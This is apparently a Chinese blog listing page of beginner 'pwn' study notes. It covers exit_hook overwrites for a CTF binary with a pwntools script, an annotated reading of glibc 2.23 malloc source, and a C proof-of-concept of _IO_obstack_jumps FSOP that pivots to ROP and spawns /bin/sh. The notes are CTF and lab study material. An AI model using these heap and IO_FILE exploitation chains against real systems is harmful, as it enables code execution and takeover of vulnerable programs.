123456789101112131415161718struct rtld_global _rtld_global =  &#123;    /* Generally the default presumption without further information is an     * executable stack but this is not true for all platforms.  */    ._dl_stack_flags = DEFAULT_STACK_PERMS,#ifdef _LIBC_REENTRANT    ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,    ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,#endif    ._dl_nns = 1,    ._dl_ns =    &#123;#ifdef _LIBC_REENTRANT      [LM_ID_BASE] = &#123; ._ns_unique_sym_table		       = &#123; .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER &#125; &#125;#endif    &#125;  &#125;;

​	根据作者文章可以知道这两个函数在_rtld_global结构体中,可以在gdb中进行打印,但为什么这个结构体定义那么简单,但在gdb中打印出来那么复杂?
​	答: 是因为在使用的时候会进行各种赋值
12345678910111213pwndbg&gt; p _rtld_global$2 = &#123;  _dl_ns = &#123;&#123;      _ns_loaded = 0x7ffff7ffe168,.....  &#125;,  audit_data = &#123;&#123;      cookie = 0,      bindflags = 0    &#125; &lt;repeats 16 times&gt;&#125;,  _dl_rtld_lock_recursive = 0x7ffff7dd7d20 &lt;rtld_lock_default_lock_recursive&gt;,  _dl_rtld_unlock_recursive = 0x7ffff7dd7d30 &lt;rtld_lock_default_unlock_recursive&gt;,......



​	找到对应的地址, 只要把这俩地址中的一个改成了onegadget就可以getshell了,(或者system+binsh)
123456789pwndbg&gt;0x7ffff7ffdf40 &lt;_rtld_global+3840&gt;:     0x0000000000000000      0x00007ffff7dd7c900x7ffff7ffdf50 &lt;_rtld_global+3856&gt;:     0x00007ffff7dd7ca0      0x00007ffff7deb0e00x7ffff7ffdf60 &lt;_rtld_global+3872&gt;:     0x0000000000000006      0x00000000000000010x7ffff7ffdf70 &lt;_rtld_global+3888&gt;:     0x00007ffff7ff5908      0x00000000000000010x7ffff7ffdf80 &lt;_rtld_global+3904&gt;:     0x0000000000001000      0x00000000000000780x7ffff7ffdf90 &lt;_rtld_global+3920&gt;:     0x0000000000000040      0x00007ffff7ff30100x7ffff7ffdfa0 &lt;_rtld_global+3936&gt;:     0x0000000000000001      0x00007ffff7de31300x7ffff7ffdfb0 &lt;_rtld_global+3952&gt;:     0x0000000000000000      0x0000000000000000



在libc-2.23中exit_hook &#x3D; libc_base+0x5f0040+3848
exit_hook &#x3D; libc_base+0x5f0040+3856
在libc-2.27中
exit_hook &#x3D; libc_base+0x619060+3840
exit_hook &#x3D; libc_base+0x619060+3848
ciscn_2019_n_7有后门函数, 直接改就行啦
最后两位 51b9
只能添加一个
2.23
1230x555555605000  0x0000000000000000      0x0000000000000021      ........!.......0x555555605010  0x000000000000000c      0x0000000a656d616e      ........name....0x555555605020  0x0000555555605030      0x0000000000000021      0P`UUU..!.......



edit这里read有溢出, name这里,
12345678910111213141516171819202122int __fastcall sub_ED0(__int64 a1, void *a2)&#123;  unsigned __int64 v3; // [rsp+8h] [rbp-10h]  v3 = __readfsqword(0x28u);  if ( unk_202014 )  &#123;    puts(&quot;New Author name:&quot;);    read(0, qword_202018 + 1, 0x10uLL);    puts(&quot;New contents:&quot;);    a1 = 0LL;    a2 = (void *)qword_202018[2];    read(0, a2, *qword_202018);    if ( __readfsqword(0x28u) == v3 )      return puts(&quot;Over.&quot;);  &#125;  else if ( __readfsqword(0x28u) == v3 )  &#123;    return puts(&quot;Dont&#x27;t exists.&quot;);  &#125;  return show(a1, (unsigned __int64)a2);&#125;



这不就能实现一个任意地址写了吗
先name溢出修改函数指针,然后实现任意地址写
思路就有了,先泄露地址,然后得到libc地址,onegadget地址, 然后计算exit_hook,改成onegadget就可以了
12345678910111213141516171819from pwn import *elf = &quot;./ciscn_2019_n_7&quot;context.log_level= &quot;debug&quot;p = process(elf)#p =remote(&quot;124.16.75.116&quot;, 52018)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)def leak():    p.recvuntil(&quot;Your choice-&gt; &quot;)    p.sendline(b&quot;666&quot;)    addr = p.recv()[0:16]    print(hex(addr))leak()p.interactive()





libcsearch
多了个回车 0a导致了打不通
哪来的0a呢,  是之前的sendline留下来的, 
那为什么删除了之后还是打不通呢?
在close 2那里出问题了
所以不能close? 直接调用exit?
对,直接sendline一个不存在的参数
1234def edit(name,content):	p.sendlineafter(&#x27;choice-&gt; \n&#x27;,&#x27;2&#x27;)	p.sendafter(&#x27;name:\n&#x27;,name)	p.sendafter(&#x27;contents:\n&#x27;,content)

https://blog.csdn.net/qq_62887641/article/details/132867225
https://www.cnblogs.com/LynneHuan/p/15229694.html
怎么找函数地址来,用libc
libc.sym
libsearch出来的呢?
onegadget的选择根据libc版本选择,虽然版本相近有时候相似,但有时候 一个字节也不能错,所以一定要确定好
能断到 onegadget吗? 应该是有些寄存器条件不符合所有有的不行
问题如果不知道版本,怎么用搜出来的libc找onegadget地址? (手动确实也不是不行..)
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析">pwn入门-53-glibc之malloc源码分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-11T05:40:56.000Z" title="发表于 2024-02-11 13:40:56">2024-02-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-11T05:41:32.188Z" title="更新于 2024-02-11 13:41:32">2024-02-11</time></span></div><div class="content">布置好分析环境和资料下载源码  https://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz
demo源码: 
12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; int main()&#123;   char *str;   str = (char *) malloc(15);   strcpy(str, &quot;hello&quot;);   printf(&quot;String = %s,  Address = 0x%lx\n&quot;, str, str);   free(str);    return(0);&#125;



glibc-all-in-one: 2.23-0ubuntu3_amd64   
给程序打好patch
修改&#x2F;usr&#x2F;lib&#x2F;debug https://blog.csdn.net/m0_51251108/article/details/127098744
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion &#96;sym !&#x3D; NULL’ failed!
https://stackoverflow.com/questions/66098387/how-to-run-an-old-binary-on-modern-gnu-linux-distribution
gcc使用特定glibc: 
gcc -L&#x2F;pwntools&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64 -Wl,–rpath&#x3D;&#x2F;pwntools&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64 -Wl,-I&#x2F;pwntools&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-2.23.so 1.c -o test
https://blog.csdn.net/m0_37876242/article/details/130018202
使用特定ld.so
&#x2F;pwntools&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-2.23.so &#x2F;pwntools&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;libc.so.6
libc.so.6: version &#96;GLIBC_2.34’ not found
可以从ubuntu16中编译一个 考出来
1gdb `find ./glibc-2.23 -type d -printf &#x27;-d %p &#x27;` ./223

b malloc
参考资料和工具chatgpt4
《ctf权威指南 pwn》
mallocglibc-2.23&#x2F;malloc&#x2F;malloc.c
malloc对应的函数是__libc_malloc(), 这是因为使用了宏
1strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, malloc)



__libc_malloc12345678910111213141516171819202122232425262728293031323334/*------------------------ Public wrappers. --------------------------------*/void *__libc_malloc (size_t bytes)&#123;  mstate ar_ptr;  void *victim; //当前要执行操作的chunk//检查是否有malloc钩子,有的话调用钩子,常用的覆盖mallochook为onegadget、system等就是这个  void *(*hook) (size_t, const void *)    = atomic_forced_read (__malloc_hook);    if (__builtin_expect (hook != NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));  arena_get (ar_ptr, bytes); //寻找一个合适的arena来分配内存  victim = _int_malloc (ar_ptr, bytes); // 尝试分配内存(重要函数)  /* Retry with another arena only if we were able to find a usable arena     before.  */   //如何没有找到合适的内存,就尝试找一个可用的arena(前提是 ar_ptr!=NULL),然后继续分配内存  if (!victim &amp;&amp; ar_ptr != NULL)    &#123;      LIBC_PROBE (memory_malloc_retry, 1, bytes);      ar_ptr = arena_get_retry (ar_ptr, bytes);      victim = _int_malloc (ar_ptr, bytes);    &#125;  if (ar_ptr != NULL)  //如果申请了arena, 还需要进行解锁该arena    (void) mutex_unlock (&amp;ar_ptr-&gt;mutex);//检查了什么呢?  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||          ar_ptr == arena_for_chunk (mem2chunk (victim)));  return victim;&#125;libc_hidden_def (__libc_malloc)





_int_malloc检查fastbin中是否有合适的1234567891011121314151617181920212223242526272829303132333435  /*     If the size qualifies as a fastbin, first check corresponding bin.     This code is safe to execute even if av is not yet initialized, so we     can try it without checking, which saves some time on this fast path.   *///fastbin分配,先进后出,比较的是无符号整数,这段代码可以在初始化堆之前运行  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))    &#123;      idx = fastbin_index (nb); //得到对应fastbin大小的下标      mfastbinptr *fb = &amp;fastbin (av, idx); //得到fastbin该大小的头指针      mchunkptr pp = *fb;      do        &#123;    // 如果fastbin中有chunk,后进先出取出来,          victim = pp;          if (victim == NULL)            break;        &#125;      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))             != victim);      if (victim != 0) // victim不等于NULL,说明找到了chunk,检查后返回给用户        &#123;        // 检查chunk大小是否和前面确定的idx一样,防止被伪造          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))            &#123;               errstr = &quot;malloc(): memory corruption (fast)&quot;;            errout:              malloc_printerr (check_action, errstr, chunk2mem (victim), av);              return NULL;            &#125;          check_remalloced_chunk (av, victim, nb); // 检查二次分配?          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;



检查smallbin中是否有合适的1234567891011121314151617181920212223242526272829303132333435363738  /*     If a small request, check regular bin.  Since these &quot;smallbins&quot;     hold one size each, no searching within bins is necessary.     (For a large request, we need to wait until unsorted chunks are     processed to find best fit. But for small ones, fits are exact     anyway, so we can check now, which is faster.)   */// smallbin范围,先进先出  if (in_smallbin_range (nb)) // 是否在范围内    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx); // 这里是获取头吧 bin[x]这个东西?      if ((victim = last (bin)) != bin)        &#123;          if (victim == 0) /* initialization check */ //尚未初始化,进行初始化            malloc_consolidate (av);          else            &#123;  // 检查双向链表是否被破坏              bck = victim-&gt;bk;	if (__glibc_unlikely (bck-&gt;fd != victim))                &#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;              set_inuse_bit_at_offset (victim, nb); //设置使用标志位              bin-&gt;bk = bck;              bck-&gt;fd = bin;              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);  // 检查分配的chunk              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;    &#125;



计算largebin的idx,整合fastbin1234567891011121314151617  /*     If this is a large request, consolidate fastbins before continuing.     While it might look excessive to kill all fastbins before     even seeing if there is space available, this avoids     fragmentation problems normally associated with fastbins.     Also, in practice, programs tend to have runs of either small or     large requests, but less often mixtures, so consolidation is not     invoked all that often in most programs. And the programs that     it is called frequently in otherwise tend to fragment.   *///  计算largebin的idx(仅仅是计算). 然后整理fastbin、检查有没有fastbin能够合并  else    &#123;      idx = largebin_index (nb);      if (have_fastchunks (av))        malloc_consolidate (av);    &#125;



大的外层for循环​	进入大循环,包含了_int_malloc之后所有过程
内层第一个while循环​	遍历unsortedbin,大小合适就取出,否则放入small&#x2F;largebin(唯一将chunk放入这俩的机会)
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// 进入大循环,包含了_int_malloc之后所有过程  for (;; )    &#123;  //内层的第一个while循环,遍历unsortedbin,大小合适就取出,否则放入small/largebin(唯一将chunk放入这俩的机会)      int iters = 0;       while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))        &#123;          bck = victim-&gt;bk;          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                             chunk2mem (victim), av);          size = chunksize (victim);          /*             If a small request, try to use last remainder if it is the             only chunk in unsorted bin.  This helps promote locality for             runs of consecutive small requests. This is the only             exception to best-fit, and applies only when there is             no exact fit for a small chunk.           */                if (in_smallbin_range (nb) &amp;&amp; // 用户请求的是smallbin大小              bck == unsorted_chunks (av) &amp;&amp; //unsorted bin只有一个chunk              victim == av-&gt;last_remainder &amp;&amp; //且chunk为last_remainder???              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) // 并且满足拆分条件时,进行拆分            &#123;              /* split and reattach remainder */              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              if (!in_smallbin_range (remainder_size))                &#123;                  remainder-&gt;fd_nextsize = NULL;                  remainder-&gt;bk_nextsize = NULL;                &#125;              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;          // 从unsorted bin中取出chunk          /* remove from unsorted list */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);          /* 如果大小合适就返回给用户 Take now instead of binning if exact fit */          if (size == nb)            &#123;              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;

​	放入small&#x2F;largebin
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 /* place chunk in bin */          // chunk大小不合适,插入对应的bin中, 插入过程就是双链表插入结点的过程          if (in_smallbin_range (size))            &#123; // bck指向头结点,fwd是头结点的fd结点,chunk会被插入到头结点和fwd结点之间,(smallbin头插)              victim_index = smallbin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;            &#125;          else // 否则在largebin的范围内            &#123;              victim_index = largebin_index (size);              bck = bin_at (av, victim_index); // 当前largebin              fwd = bck-&gt;fd;   // 当前bin中最大的chunk            // 需要对双链表进行额外操作,找到合适大小的位置              /* maintain large bins in sorted order */              if (fwd != bck) // 链表不为空                &#123;                  /* Or with inuse bit to speed comparisons */                  size |= PREV_INUSE; // 先设置PREV_INUSE                  /* if smaller than smallest, bypass loop below */                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);                  // 如果要申请的大小小于这个largebin的最小的chunk,就把它放到最后面(链尾) (还是看图理解比较好                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    &#123;                      fwd = bck;     // largebin本身                      bck = bck-&gt;bk; // 当前最小chunk                      victim-&gt;fd_nextsize = fwd-&gt;fd;// 最大的chunk                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; // 最小的chunk                      // 这一句其实干了两件事,可以分两步来的,                      // 先把最小chunk的fd_nextsize指向了victim,然后又把最大chunk的bk_nextsize指向了victim                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                    &#125;                  else // 如果不小于最小的chunk的话,就通过fd_nextsize找到不比它大的chunk(&lt;=)                    &#123;                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                      while ((unsigned long) size &lt; fwd-&gt;size) //小于该chunk大小,就继续往前找                         &#123;                          fwd = fwd-&gt;fd_nextsize;                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                        &#125;                      if ((unsigned long) size == (unsigned long) fwd-&gt;size) //等于                        /* Always insert in the second position.  */                        fwd = fwd-&gt;fd; // bk为什么不修改呢,后面的chunk??没读懂 =》在后面修改                      // 先修改改大的顺序,具体指针后面再改                      else // 大于了,要插入进去                        &#123;                          //下面两句是把victim插入fwd和比它大的chunk之间                          victim-&gt;fd_nextsize = fwd;                           victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize = victim; // 修改fwd的bk_nextsize值为victim                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; // 修改比victim大的chunk的fd_nextsize                        &#125;                      bck = fwd-&gt;bk; // fwd此时已经是第二个了,它的bk就是第一个,                    &#125;                &#125;              else                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;            &#125;          mark_bin (av, victim_index);          victim-&gt;bk = bck; // 插入 bak和fwd之间          victim-&gt;fd = fwd;          fwd-&gt;bk = victim; // 修改fwd和bck的指针          bck-&gt;fd = victim;#define MAX_ITERS       10000          if (++iters &gt;= MAX_ITERS)            break;        &#125;

largebin请求12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/*        If a large request, scan through the chunks of current bin in        sorted order to find smallest that fits.  Use the skip list for this.      */       //  进入largebin了... 不对..不是..这是啥     if (!in_smallbin_range (nb))       &#123;         bin = bin_at (av, idx);         /* skip scan if empty or largest chunk is too small */         if ((victim = first (bin)) != bin &amp;&amp; //如果victim等于头结点,说明bin为空             (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //小于nb,说明大小没有合适的           &#123;//反向遍历bk_nextsize,从最小的大小开始,找到第一个不小于nb的chunk             victim = victim-&gt;bk_nextsize;              while (((unsigned long) (size = chunksize (victim)) &lt;                     (unsigned long) (nb)))               victim = victim-&gt;bk_nextsize;             // 如果该chunk与victim的fd一样大,就选择fd chunk,避免改动nextsize             /* Avoid removing the first entry for a size so that the skip                list does not have to be rerouted.  */             if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)               victim = victim-&gt;fd;             remainder_size = size - nb;             unlink (av, victim, bck, fwd);             /* Exhaust */             if (remainder_size &lt; MINSIZE)               &#123; //如果该chunk减去nb小于MINSIZE,直接把该chunk返回给用户                 set_inuse_bit_at_offset (victim, size);                 if (av != &amp;main_arena)                   victim-&gt;size |= NON_MAIN_ARENA;               &#125;             /* Split */ // 减去nb大于MINSIZE的话,将remainder放入unsortedbin             else               &#123;                 remainder = chunk_at_offset (victim, nb);                 /* We cannot assume the unsorted list is empty and therefore                    have to perform a complete insert here.  */                 bck = unsorted_chunks (av);                 fwd = bck-&gt;fd;  if (__glibc_unlikely (fwd-&gt;bk != bck))                   &#123;                     errstr = &quot;malloc(): corrupted unsorted chunks&quot;;                     goto errout;                   &#125;                 remainder-&gt;bk = bck;                 remainder-&gt;fd = fwd;                 bck-&gt;fd = remainder;                 fwd-&gt;bk = remainder;                 if (!in_smallbin_range (remainder_size))                   &#123;                     remainder-&gt;fd_nextsize = NULL;                     remainder-&gt;bk_nextsize = NULL;                   &#125;                 set_head (victim, nb | PREV_INUSE |                           (av != &amp;main_arena ? NON_MAIN_ARENA : 0));                 set_head (remainder, remainder_size | PREV_INUSE);                 set_foot (remainder, remainder_size);               &#125;             check_malloced_chunk (av, victim, nb);             void *p = chunk2mem (victim);             alloc_perturb (p, bytes);             return p;           &#125;       &#125;



内层第二个while循环</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop">pwn入门-52-iofile结合特殊gadget进行rop</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-10T12:22:28.000Z" title="发表于 2024-02-10 20:22:28">2024-02-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-14T10:08:10.945Z" title="更新于 2024-02-14 18:08:10">2024-02-14</time></span></div><div class="content">https://tokameine.top/2023/02/20/glibc2-34-iofile-exploit/
书接上回,如果进行了seccomp等限制了getshell,那么就需要进行orw了
rop博客中123gg1 = libc.search(asm(&quot;mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]&quot;)).__next__()gg2 = libc.search(asm(&quot;mov rsp, rdx; ret&quot;)).__next__()gg3 = libc.search(asm(&#x27;add rsp, 0x30; mov rax, r12; pop r12; ret&#x27;)).__next__()





另外一种gadget​	rop的话其实就是把 system函数地址 换成了一个特殊的gadget
​	rdi其实是自己传入的chunk地址? rdi是进入CALL_CHUNKFUN前,也就是_obstack_newchunk函数时
​	rdi此时是自己伪造的第一个chunk,链入chain中的, 在进入CALL_CHUNKFUN前,要执行这两条指令,所以此时可以借此修改rdi, 把rdi+0x48的位置写入自己伪造的第二个chunk的地址 ( 好奇如果不是自己伪造的话,这里本来应该是什么值的? 是 _IO_save_base
123  0x7ffff7e3ed8c &lt;_obstack_newchunk+76&gt;    mov    rdi, qword ptr [rdi + 0x48]► 0x7ffff7e3ed90 &lt;_obstack_newchunk+80&gt;    mov    rsi, rbp  0x7ffff7e3ed93 &lt;_obstack_newchunk+83&gt;    call   rax

​	然后就执行这一段gadget了, 这一段可以把rdi+0x48还是布置成此chunk地址,然后rbp+0x18就是rdi+0x18了,rax就是rdi了,然后最后call rax+0x28 就是 call  rdi+0x28,这是第一条指令,然后如果想rop的话,这里写入leave;ret;
1234567891011 b *svcudp_reply +26     pwndbg&gt; disass svcudp_replyDump of assembler code for function svcudp_reply:...........	   0x00007ffff7f00bca &lt;+26&gt;:	mov    rbp,QWORD PTR [rdi+0x48]   0x00007ffff7f00bce &lt;+30&gt;:	mov    rax,QWORD PTR [rbp+0x18]   0x00007ffff7f00bd2 &lt;+34&gt;:	lea    r13,[rbp+0x10]   0x00007ffff7f00bd6 &lt;+38&gt;:	mov    DWORD PTR [rbp+0x10],0x0   0x00007ffff7f00bdd &lt;+45&gt;:	mov    rdi,r13   0x00007ffff7f00be0 &lt;+48&gt;:	call   QWORD PTR [rax+0x28]



​	然后此时rbp派上用上了,把它传给rsp,然后从rsp+8位置开始继续执行指令,
​	leave;ret   &#x3D;  mov rsp,rbp;pop rbp;    pop rip;
栈迁移目标chunk的选择​	此时有两种选择, 要么还是同一个chunk,但是要把一些无用的数据pop掉,然后继续用,还是一种是,直接迁移到一个干净的chunk中
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define writeend_offset 0x30#define writeptr_offset 0x28#define vtable_offset 0xd8#define next_free_offset 0x18 #define chunk_limit_offset 0x20#define caller_offset 0x38#define caller_arg_offset 0x48#define use_arg_offset 0x50#define fake_obstack_offset 0xe0void backdoor(char *cmd)&#123;  puts(&quot;OHHH!HACKER!!!&quot;);  puts(&quot;HERE IS U SHELL!&quot;);  system(cmd);&#125;char *fake_arg = &quot;/bin/sh\x00&quot;;int main(void)&#123;    puts(&quot;this is a poc&quot;);    size_t libc_base = &amp;puts - 0x80ef0;    size_t _IO_list_all_prt = libc_base + 0x21a660;    size_t _IO_obstack_jumps_prt = libc_base + 0x2163c0;    void *ptr,*ropptr;    long long *list_all_ptr;    ropptr = malloc(0x300);    ptr=malloc(0x200); // 注意这俩顺序    //bypass    *(long long*)((long long)ptr+writeptr_offset)=0x1;    *(long long*)((long long)ptr+writeend_offset)=0x0;    *(long long*)((long long)ptr+next_free_offset)=0x1;    *(long long*)((long long)ptr+chunk_limit_offset)=0x0;    *(long long*)((long long)ptr+use_arg_offset)=0x1;    *(long long*)((long long)ptr+fake_obstack_offset)=(long long*)ptr;    //vtable _IO_obstack_jumps_prt    *(long long*)((long long)ptr+vtable_offset)=(long long*)(_IO_obstack_jumps_prt+0x20);    //set the function to call and its parameters    *(long long*)((long long)ptr+caller_offset)=(long long*)(libc_base+0x168bca);    *(long long*)((long long)ptr+caller_arg_offset)=(long long*)(libc_base+0x168bca);        *(long long*)((long long)ptr+0x48)=(long long*)(ropptr); //mov    rbp,QWORD PTR [rdi+0x48]    *(long long*)((long long)ropptr+0x48)=(long long*)ropptr;    *(long long*)((long long)ropptr+0x18)=(long long*)ropptr;//mov    rax,QWORD PTR [rbp+0x18]    *(long long*)((long long)ropptr+0x28)=(long long*)(libc_base+0x561cc); //call   QWORD PTR [rax+0x28]      leave;ret    *(long long*)((long long)ptr+writeptr_offset)=0x1;            const char binsh[] = &quot;/bin/sh&quot;;    memcpy((char *)ropptr + 0x80, binsh, sizeof(binsh));    *(long long*)((long long)ropptr+0x8)=(long long*)(libc_base+0x11e491);      *(long long*)((long long)ropptr+0x20)=(long long*)(libc_base+0x2a6c5);    *(long long*)((long long)ropptr+0x30)=(long long*)(libc_base+0x2a6c5);    *(long long*)((long long)ropptr+0x38)=(long long*)(ropptr+0x80);     *(long long*)((long long)ropptr+0x40)=(long long*)(&amp;system);            //_IO_list_all _chain 2 fake _IO_FILE_plus    list_all_ptr=(long long *)(_IO_list_all_prt + 0x68 + 0x20);    list_all_ptr[0]=ptr;    exit(0);&#125;



ropptr 那里可以布置rop了,
rdi是怎么来的???什么时候控制的??
123  0x7ffff7e3ed8c &lt;_obstack_newchunk+76&gt;    mov    rdi, qword ptr [rdi + 0x48]► 0x7ffff7e3ed90 &lt;_obstack_newchunk+80&gt;    mov    rsi, rbp  0x7ffff7e3ed93 &lt;_obstack_newchunk+83&gt;    call   rax



0x000000000005f65a : pop rdx ; ret
0x000000000011e491 : pop rdx ; pop r12 ; ret
libc_base+0x2a6c5);&#x2F;&#x2F;pop rdi;ret

</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用">pwn入门-51-_IO_obstack_jumps利用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-10T12:21:41.000Z" title="发表于 2024-02-10 20:21:41">2024-02-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-14T10:11:56.644Z" title="更新于 2024-02-14 18:11:56">2024-02-14</time></span></div><div class="content">前言​	高版本的iofile利用还是比较常见的手法,
​	主要参考: https://tttang.com/archive/1845/
23.04docker或者虚拟机,需要加一个LC_CTYPE来运行,不然字符集有问题
1LC_CTYPE=C.UTF-8 gdb `find ./glibc-2.34 -type d -printf &#x27;-d %p &#x27;` ./chal



​	还是没有符号呀. 符号的话, 需要改一下&#x2F;usr&#x2F;lib&#x2F;debug https://blog.csdn.net/m0_51251108/article/details/127098744
​	vtable劫持检测: 2.24后加入了针对IO_FILE_plus的vtable劫持的检测措施, 所以vtable地址必须合法, 所以要选择一个可以利用的vtable, 例如本文中的_IO_obstack_jumps
​	总之布局的参数, 要么是绕过判断条件进入想要的分支、要么是构造参数
​	将vtable替换成&amp;_IO_obstack_jumps+0x20,这样vtable+0x18地址就指向了 _IO_obstack_xsputn
利用条件1. 一次任意地址写 劫持_IO_list_all或者chain等(如`large bin attack`、`tcache stashing unlink attack`、`fastbin reverse into tcache`)
1. 能够触发io流（`FSOP`或触发`__malloc_assert`，或者程序中存在`puts`等能进入`IO`链的函数），执行`IO`相关函数。
1. 泄漏堆地址和libc基址

利用流程分析_IO_obstack_jumps​	能看到只有两个函数可以利用( 所以如果以后有新的函数加进来,可能就会有新的利用手法了
12345678910111213141516171819202122232425/* the jump table.  */const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, NULL),  JUMP_INIT(overflow, _IO_obstack_overflow),  JUMP_INIT(underflow, NULL),  JUMP_INIT(uflow, NULL),  JUMP_INIT(pbackfail, NULL),  JUMP_INIT(xsputn, _IO_obstack_xsputn),  JUMP_INIT(xsgetn, NULL),  JUMP_INIT(seekoff, NULL),  JUMP_INIT(seekpos, NULL),  JUMP_INIT(setbuf, NULL),  JUMP_INIT(sync, NULL),  JUMP_INIT(doallocate, NULL),  JUMP_INIT(read, NULL),  JUMP_INIT(write, NULL),  JUMP_INIT(seek, NULL),  JUMP_INIT(close, NULL),  JUMP_INIT(stat, NULL),  JUMP_INIT(showmanyc, NULL),  JUMP_INIT(imbue, NULL)&#125;;



_IO_obstack_xsputn函数分析​	obstack_blank_fast如何保证的内存安全呢? 
